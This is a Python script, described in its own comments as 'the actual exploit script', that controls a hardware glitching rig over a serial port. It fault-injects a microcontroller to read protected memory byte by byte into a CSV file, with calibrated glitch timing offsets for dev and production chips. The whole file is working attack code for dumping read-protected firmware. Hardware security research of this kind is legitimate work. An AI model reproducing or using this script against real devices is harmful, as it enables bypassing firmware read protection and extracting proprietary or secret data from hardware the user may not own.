import serial
import time
import signal
import sys
import datetime
import os
from explore import update_waveform, glitch
import queue

# This script is the actual exploit script
# it writes the data read to a file 'data.csv'
# it can restart without losing progress
# only the locations list needs to be updatet

# dev glitch
# locations = [(32785, 11), (172781, 12)]

# production glitch
# locations = [(32775, 10), (172781, 11)]

# recalibrated after 7 hours
locations = [(32791, 8), (172784, 10)]

if os.path.exists('data.csv'):
    with open('data.csv') as f:
        for line in f:
            pass
        last_line = line
    begin_address = int(last_line.split(',')[0]) + 1
else:
    begin_address = 0
current_address = begin_address
data = {}


start = time.time()
start_datetime = datetime.datetime.now()
last_success = datetime.datetime.now()
glitch1_avg = queue.Queue(1000)
glitch2_avg = queue.Queue(1000)

def signal_handler(sig, frame):
    sys.exit(0)

signal.signal(signal.SIGINT, signal_handler)

with serial.Serial('/dev/ttyACM0', 115200) as ser:
    with open('data.csv', 'a') as datafile:
        ser.write(b's')
        glitch_size_bytes = int(ser.read_until(b'.')[:-1]) * 4
        print(f'Glitch buffer size = {glitch_size_bytes}')

        ser.write(b'a')
        ser.write([0x90, (current_address>>8)&0xff, current_address&0xff, 0xE0]) # set dptr, load dptr to A
        assert ser.read(2) == b'a.'

        update_waveform(ser, glitch_size_bytes, *locations)
        while current_address < 0x8000:
            response = glitch(ser)
            glitch1_succ = response[1] == 0xb2
            if glitch1_avg.full():
                glitch1_avg.get()
            glitch1_avg.put(glitch1_succ)
            glitch2_succ = response[3] == 0xb2
            if glitch2_avg.full():
                glitch2_avg.get()
            glitch2_avg.put(glitch2_succ)
            if response[1] == 0xb2 and response[3] == 0xb2:
                print(f'SUCCESS: {response.hex(" ")}')
                data[current_address] = response[2]
                print(f'{current_address},{response[2]}', file=datafile)
                current_address += 1
                if current_address & 0xff == 0:
                    print(data)
                    datafile.flush()
                ser.write(b'a')
                ser.write([0x90, (current_address>>8)&0xff, current_address&0xff, 0xE0]) # set dptr, load dptr to A
                assert ser.read(2) == b'a.'
                last_success = datetime.datetime.now()
            total_work = 0x8000 - begin_address
            progress = (current_address - begin_address + 0.5) / total_work
            time_spent = datetime.datetime.now() - start_datetime
            total_time_estimated = time_spent / progress
            print(response.hex(' '), f"{current_address} "
                  f"all={current_address/0x8000*100:>5.2f}% now={progress*100:>5.2f}% "
                  f"[{' X'[glitch1_succ]}] {sum(glitch1_avg.queue)/len(glitch1_avg.queue)*100:>5.2f} % succ [{' X'[glitch2_succ]}] {sum(glitch2_avg.queue)/len(glitch2_avg.queue)*100:>5.2f}% succ "
                  f"elapsed={time_spent} eta={datetime.datetime.now() + total_time_estimated} since_success={datetime.datetime.now() - last_success}")

